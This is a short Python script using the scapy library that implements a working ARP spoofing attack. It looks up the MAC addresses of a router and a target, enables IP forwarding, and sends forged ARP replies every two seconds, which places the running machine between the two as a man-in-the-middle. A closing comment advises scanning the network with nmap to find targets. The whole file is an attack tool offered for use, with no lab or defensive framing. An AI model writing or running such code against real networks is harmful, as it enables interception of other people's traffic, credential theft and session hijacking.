import scapy.all as scapy
import sys, time, os
from scapy.layers.l2 import ARP, Ether

#Get MAC address
def get_mac_address(ip):

    #Create the Ethernet layer
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')

    #Create the ARP layer
    arp_layer = ARP(pdst=ip)

    #Merge the two layers into one pkt
    get_mac_packet = broadcast_layer/arp_layer

    #Response
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

#Send the spoofing packets
def spoof(router_ip, target_ip, router_mac, target_mac):

    #Create a packet to the router spoofing like the target
    packet1 = ARP(
        op=2, #operation: 1 = who-has, 2 = is-at
        hwdst=router_mac, #MAC of the destination
        pdst=router_ip, #IP of the destination
        psrc=target_ip #IP of the source
    )

    # Create a packet to the target spoofing like the router
    packet2 = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

    #Send the packets
    scapy.send(packet1)
    scapy.send(packet2)

#Get IP address from the command line
target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])

#Get MAC address of target and router
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    #Enable IP Forwarding
    os.system("echo 1 >> /proc/sys/net/ipv4/ip_forward")
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)

#Interrupt the while loop via keyboard
except KeyboardInterrupt:
    #Disable IP Forwarding
    os.system("echo 0 >> /proc/sys/net/ipv4/ip_forward")
    print('Closing ARP Spoofer')
    exit(0)



#Use the command below to scan your network and find the IP address of the target
# nmap -O networkIP/CIDR